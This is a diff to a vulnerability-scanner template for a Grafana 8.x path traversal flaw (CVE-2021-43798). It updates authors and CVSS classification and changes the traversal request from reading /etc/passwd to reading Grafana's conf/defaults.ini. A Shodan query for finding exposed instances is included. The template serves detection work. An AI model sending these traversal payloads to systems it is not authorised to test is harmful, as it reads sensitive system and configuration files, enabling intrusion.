@@ -2,7 +2,7 @@ id: grafana-file-read
 
 info:
   name: Grafana 8.x - Local File Inclusion
-  author: z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0
+  author: z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0,j4vaovo
   severity: high
   description: Grafana 8.x is vulnerable to local file inclusion.
   reference:
@@ -12,18 +12,19 @@ info:
     - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
     - https://twitter.com/naglinagli/status/1468155313182416899
     - https://nvd.nist.gov/vuln/detail/CVE-2021-43798
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2021-43798
+    cwe-id: CWE-22
   metadata:
     shodan-query: title:"Grafana"
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
-  tags: grafana,lfi,fuzz
+  tags: grafana,lfi
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini"
 
     payloads:
       pluginSlug: helpers/wordlists/grafana-plugins.txt
@@ -32,13 +33,13 @@ requests:
     stop-at-first-match: true
     matchers-condition: and
     matchers:
-
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
+      - type: word
+        part: body
+        words:
+          - "socket = /tmp/grafana.sock"
+          - "http_port"
+        condition: and
 
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/07/22
